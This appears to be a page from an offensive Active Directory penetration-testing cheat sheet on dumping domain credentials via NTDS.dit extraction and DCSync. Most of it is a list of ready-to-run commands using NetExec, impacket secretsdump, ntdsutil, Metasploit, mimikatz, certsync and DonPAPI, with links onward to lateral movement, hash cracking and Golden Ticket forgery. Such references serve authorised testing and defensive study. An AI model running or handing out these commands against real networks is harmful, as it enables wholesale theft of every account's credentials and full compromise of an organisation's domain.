# NTDS and DCsync

Domain dominance means access to every credential in the domain. Two routes reach it: extract the `NTDS.dit` database from a DC, or use DCSync to replicate the hashes over the wire. Both yield the krbtgt hash, the key to Golden Tickets.

## Why It Works

The domain database holds the password hash of every account. A domain controller will replicate those hashes to anyone with replication rights (DCSync), and the database file itself is readable with DC admin — either way the whole domain's secrets are exposed at once.

## Prerequisites

* Domain admin, or DCSync replication rights (see ACL Abuse)
* Network or local access to a DC

## Execution

**Dump ntds.dit**

* `nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
* `secretsdump.py '<domain>/<user>:<pass>'@<ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
* `ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`
  * `secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
    * **→ Lateral move**
    * **→ Crack hash**
* `msf> windows/gather/credentials/domain_hashdump` [\[tool\]](https://docs.metasploit.com/)
* `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
* `certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>` [\[tool\]](https://github.com/zblurx/certsync)

**Grab backup Keys**

* `donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk` [\[tool\]](https://github.com/login-securite/DonPAPI)
  * **→ Credentials**

## Related

* [DCSync Rights](file:///9685693/acl-abuse/dcsync-rights.md) — obtaining DCSync rights without DA
* [Golden, Silver, Diamond & Sapphire Tickets](file:///9685693/domain-dominance/golden-and-silver-tickets.md) — forging tickets with the krbtgt hash
